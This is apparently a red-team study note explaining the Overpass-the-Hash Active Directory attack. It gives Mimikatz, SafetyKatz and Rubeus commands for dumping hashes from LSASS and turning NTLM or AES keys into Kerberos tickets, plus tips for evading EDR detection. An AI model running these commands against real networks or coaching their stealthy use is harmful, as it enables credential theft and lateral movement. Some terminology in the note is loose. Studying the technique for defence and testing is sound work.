
> [!abstract] Overpass-the-Hash (OPTH) Attack
> Overpass-the-Hash (sometimes referred to as Pass-the-Ticket) is an advanced Active Directory attack technique. It involves using an NTLM hash to request a Kerberos Ticket Granting Ticket (TGT) from the Key Distribution Center (KDC), instead of using the hash directly for NTLM authentication. This allows attackers to bypass standard NTLM restrictions and fully leverage the more secure Kerberos protocol.
> - **T1550.002:** [Use Alternate Authentication Material: Pass the Hash](https://attack.mitre.org/techniques/T1550/002/)
> - **T1550.003:** [Use Alternate Authentication Material: Pass the Ticket](https://attack.mitre.org/techniques/T1550/003/)
> - **Defense Evasion:** Use alternate authentication material.
## Concept & Differences

> [!info] PTH vs. OPTH
> - **Pass-the-Hash (PTH):** Using an NTLM hash to authenticate to a *local* user on another machine locally.
> - **Overpass-the-Hash (OPTH):** Using an NTLM hash to authenticate *within an Active Directory domain*. It generates Kerberos tickets (tokens) from hashes or keys. It is essentially a combination of PTH and Pass-the-Ticket (PTT).

> [!example]+ How Overpass-the-Hash Works
> 1. **Obtain NTLM Hash:** The attacker extracts the NTLM hash (or AES keys) from memory (LSASS) or `NTDS.dit` using credential dumping tools.
> 2. **Request Kerberos TGT:** Instead of using the hash for direct NTLM authentication, the attacker sends an AS-REQ to the KDC using the NTLM hash. The KDC is tricked into issuing a valid Kerberos TGT.
> 3. **Access Domain Resources:** The attacker uses the TGT to request service tickets (TGS) for domain resources (file shares, RDP, etc.) without ever knowing the plaintext password.

## Execution & Tools

> [!danger]+ Mimikatz & SafetyKatz (Requires Elevation)
> OPTH generates tokens from hashes or keys. You must run these tools as Administrator. These commands start a new process with a Logon Type 9 (same as `runas /netonly`).
> 
> **Mimikatz:**
> ```cmd
> # 1. Dump NTLM hashes from MSV SSP
> mimikatz # privilege::debug
> mimikatz # sekurlsa::msv
> 
> # 2. Overpass the Hash using NTLM
> mimikatz # sekurlsa::pth /user:Administrator /domain:sindad.local /ntlm:<NTLM_HASH> /run:cmd.exe
> 
> # 3. Overpass the Hash using AES256 Key (Better OPSEC)
> mimikatz # sekurlsa::pth /user:Administrator /domain:adolf.local /aes256:<AES256_KEY> /run:powershell.exe
> ```
> 
> **SafetyKatz:**
> ```powershell
> SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:adolf.local /aes256:<aes256keys> /run:cmd.exe" "exit"
> ```

> [!bug]+ Rubeus (Modern & Preferred Method)
> Rubeus is a C# tool for interacting with Kerberos. It is heavily preferred in modern red teaming over Mimikatz for OPTH.
> 
> **Without Elevation (Using RC4/NTLM Hash):**
> ```powershell
> # Requests a TGT and injects it into the current session (/ptt)
> Rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt
> ```
> 
> **With Elevation / OPSEC Safe (Using AES256 Key):**
> ```powershell
> # Creates a hidden process, better for evasion
> Rubeus.exe asktgt /user:administrator /aes256:<aes256_key> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show
> ```

---

> [!warning] Important OPSEC Note: Mimikatz vs. Rubeus in Modern Environments
> In modern enterprise environments (Windows 10/11, Server 2019/2022) equipped with modern EDR (Endpoint Detection and Response) solutions, **Mimikatz's sekurlsa::pth command is heavily monitored and usually blocked.**
> 
> Mimikatz interacts directly with LSASS memory to patch or manipulate authentication, which immediately triggers EDR alerts.
> 
> **Red Teams and Attackers have largely moved to Rubeus for Overpass-the-Hash.** Rubeus directly interacts with standard Windows Kerberos APIs (requesting the TGT via legitimate network calls) without needing to touch LSASS memory directly for ticket creation. If you have the NTLM or AES hash, always use `Rubeus.exe asktgt` instead of Mimikatz's `sekurlsa::pth` to maintain stealth and reliability.

